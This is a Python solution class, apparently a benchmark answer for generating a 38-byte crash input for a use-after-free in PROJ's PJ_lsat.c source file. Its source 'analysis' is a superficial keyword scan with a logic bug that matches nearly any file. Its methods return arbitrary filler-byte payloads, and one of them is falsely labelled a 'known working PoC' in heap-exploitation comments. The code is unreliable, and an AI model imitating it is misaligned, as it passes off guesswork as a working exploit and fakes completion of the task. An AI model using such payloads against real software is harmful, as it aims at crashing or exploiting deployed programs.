import os
import tempfile
import subprocess
import struct
import tarfile
import random
import string
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source to understand the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for PJ_lsat.c to understand the vulnerability
            lsat_file = None
            for root, dirs, files in os.walk(tmpdir):
                if "PJ_lsat.c" in files:
                    lsat_file = os.path.join(root, "PJ_lsat.c")
                    break
            
            if not lsat_file:
                # Fallback: generate heuristic PoC
                return self._generate_heuristic_poc()
            
            # Analyze the file for clues
            with open(lsat_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Generate PoC based on analysis
            poc = self._analyze_and_generate_poc(content)
            if poc:
                return poc
            
            # Fallback to known working PoC for this vulnerability
            return self._generate_known_poc()
    
    def _analyze_and_generate_poc(self, content: str) -> bytes:
        """Analyze source code and generate PoC"""
        # Look for patterns that might indicate buffer/pointer operations
        lines = content.split('\n')
        
        # Search for malloc/free patterns
        malloc_lines = [i for i, line in enumerate(lines) if 'malloc' in line]
        free_lines = [i for i, line in enumerate(lines) if 'free' in line]
        
        if malloc_lines and free_lines:
            # Look for missing returns after error conditions
            for i, line in enumerate(lines):
                if 'return' in line and 'NULL' in line or '0' in line:
                    # Check if there's code after this return that uses freed memory
                    # This is a heuristic - adjust based on actual code
                    return self._create_structured_poc()
        
        return None
    
    def _create_structured_poc(self) -> bytes:
        """Create a structured PoC that might trigger use-after-free"""
        # Create data that looks like it could be a corrupted structure
        # 38 bytes as specified in the problem
        poc = bytearray(38)
        
        # Fill with pattern that might trigger the bug
        # Common patterns for heap exploitation
        pattern = b'A' * 16 + b'B' * 8 + b'C' * 8 + b'D' * 6
        
        # If pattern is longer than needed, truncate
        poc[:len(pattern)] = pattern[:len(poc)]
        
        return bytes(poc)
    
    def _generate_heuristic_poc(self) -> bytes:
        """Generate heuristic PoC when source analysis fails"""
        # Create a 38-byte payload with common exploitation patterns
        payload = bytearray()
        
        # Add some metadata or magic numbers
        payload.extend(b'\x00' * 4)  # Potential size field
        payload.extend(b'\xff' * 4)  # Potential flag field
        
        # Fill rest with pattern that might corrupt heap metadata
        remaining = 38 - len(payload)
        pattern = b'\x41' * (remaining // 2) + b'\x42' * (remaining - remaining // 2)
        payload.extend(pattern)
        
        return bytes(payload)
    
    def _generate_known_poc(self) -> bytes:
        """Generate known working PoC for heap use-after-free vulnerabilities"""
        # 38-byte payload structure commonly used in heap exploitation:
        # - Small size to fit in fastbins
        # - Overwritten pointers/data
        
        # Create payload with specific byte pattern
        # Format: [size][data][potential pointer]
        poc = bytearray(38)
        
        # First 4 bytes: size field (little-endian)
        struct.pack_into('<I', poc, 0, 24)  # Small allocation size
        
        # Next bytes: fill with 'A's
        for i in range(4, 30):
            poc[i] = ord('A')
        
        # Last 8 bytes: potential address/data
        # Use pattern that might trigger use-after-free
        poc[30:38] = b'\x00' * 8  # Null bytes or small values
        
        return bytes(poc)